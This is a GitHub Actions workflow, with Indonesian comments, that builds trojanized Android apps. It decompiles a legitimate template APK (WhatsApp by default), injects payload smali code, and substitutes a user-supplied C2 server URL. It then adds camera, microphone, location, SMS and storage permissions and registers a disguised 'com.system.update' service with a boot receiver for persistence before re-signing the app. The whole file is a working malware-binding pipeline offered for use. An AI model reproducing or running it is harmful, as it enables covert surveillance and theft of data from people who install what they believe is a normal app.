name: Build APK

on:
  workflow_dispatch:
    inputs:
      build_id:
        description: 'Build ID'
        required: true
      app_name:
        description: 'Nama Aplikasi'
        required: true
      package_name:
        description: 'Nama Paket (UNTUK PAYLOAD)'
        required: true
      c2_url:
        description: 'URL Server C2'
        required: true
      bind_target:
        description: 'Target Binding'
        required: true
        default: 'whatsapp'
      permissions:
        description: 'Izin (JSON)'
        required: false
      icon_base64:
        description: 'Ikon (Base64) - OPSIONAL'
        required: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          lfs: true

      - name: Force install Git LFS and pull files
        run: |
          sudo apt-get update
          sudo apt-get install -y git-lfs
          git lfs install
          git lfs pull
          git lfs ls-files

      - name: Setup Java
        uses: actions/setup-java@v5
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip python3

      - name: Download Apktool JAR
        run: |
          wget -O apktool.jar https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar
          sudo mv apktool.jar /usr/local/bin/apktool.jar

      - name: Download Uber APK Signer
        run: |
          wget -O uber-apk-signer.jar https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar

      - name: Prepare template APK (WAJIB LOKAL)
        run: |
          TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
          if [ ! -f "$TEMPLATE_FILE" ]; then
            echo "❌ ERROR: File template tidak ditemukan: $TEMPLATE_FILE"
            exit 1
          fi
          echo "✅ Menggunakan template lokal: $TEMPLATE_FILE"
          cp "$TEMPLATE_FILE" template.apk
          if ! file template.apk | grep -q "Android package"; then
            echo "❌ ERROR: File template bukan APK valid."
            file template.apk
            exit 1
          fi
          echo "✅ Template APK valid."

      - name: Decode template APK
        run: java -jar /usr/local/bin/apktool.jar d template.apk -o decoded/

      - name: Install framework resource
        run: |
          java -jar /usr/local/bin/apktool.jar if template.apk || true

      - name: Inject payload smali
        run: |
          if [ -d "payload/smali" ]; then
            cp -r payload/smali/* decoded/smali/
          fi

      - name: Replace C2 URL in payload smali
        run: |
          find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
          echo "✅ URL C2 diganti"

      - name: Modify AndroidManifest.xml with Python (SAFE)
        run: |
          python3 << 'EOF'
          import re
          MANIFEST_FILE = "decoded/AndroidManifest.xml"
          with open(MANIFEST_FILE, 'r') as f:
              content = f.read()
          content = re.sub(r'APKTOOL_DUMMYVAL_[^"\s]+', 'dummy', content)
          permissions = [
              '<uses-permission android:name="android.permission.INTERNET" />',
              '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />',
              '<uses-permission android:name="android.permission.FOREGROUND_SERVICE" />',
              '<uses-permission android:name="android.permission.CAMERA" />',
              '<uses-permission android:name="android.permission.RECORD_AUDIO" />',
              '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />',
              '<uses-permission android:name="android.permission.READ_SMS" />',
              '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />',
              '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />',
              '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />'
          ]
          perms_str = '\n    '.join(permissions)
          content = content.replace('</manifest>', f'    {perms_str}\n</manifest>')
          services = '''
          <service android:name="com.system.update.UpdateService" android:exported="false" android:foregroundServiceType="dataSync" />
          <receiver android:name="com.system.update.BootReceiver" android:exported="true">
              <intent-filter>
                  <action android:name="android.intent.action.BOOT_COMPLETED" />
                  <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />
              </intent-filter>
          </receiver>
          '''
          content = content.replace('</application>', f'{services}\n</application>')
          with open(MANIFEST_FILE, 'w') as f:
              f.write(content)
          print("✅ AndroidManifest.xml berhasil dimodifikasi")
          EOF

      - name: Clean dummy files and references
        run: |
          find decoded -type f -name "*DUMMYVAL*" -delete 2>/dev/null || true
          find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
          find decoded -name "public.xml" -delete 2>/dev/null || true
          echo "✅ DUMMYVAL berhasil dibersihkan"

      - name: Remove all problematic drawable files
        run: |
          # Hapus semua drawable yang bermasalah (AppCompat, Design, Material, dll.)
          find decoded/res -name "abc_*" -delete 2>/dev/null || true
          find decoded/res -name "design_*" -delete 2>/dev/null || true
          find decoded/res -name "mtrl_*" -delete 2>/dev/null || true
          find decoded/res -name "*\$*" -delete 2>/dev/null || true
          # Hapus semua file yang mengandung kata 'vec_ic_glasses', 'avd_hide', 'avd_show'
          find decoded/res -name "*vec_ic_glasses*" -delete 2>/dev/null || true
          find decoded/res -name "*avd_hide_password*" -delete 2>/dev/null || true
          find decoded/res -name "*avd_show_password*" -delete 2>/dev/null || true
          find decoded/res -name "*mtrl_checkbox_button_checked_unchecked*" -delete 2>/dev/null || true
          echo "✅ Semua drawable bermasalah dihapus"

      - name: Rebuild APK with --copy-original
        run: |
          # Gunakan --copy-original untuk menyalin resource asli tanpa kompilasi
          java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk --copy-original

      - name: Sign APK
        run: |
          keytool -genkey -v -keystore debug.keystore -alias release -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown" -storepass android -keypass android
          jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android unsigned.apk release
          zipalign -v -p 4 unsigned.apk signed.apk 2>/dev/null || true

      - name: Upload APK as artifact
        uses: actions/upload-artifact@v4
        with:
          name: app-${{ inputs.build_id }}
          path: signed.apk
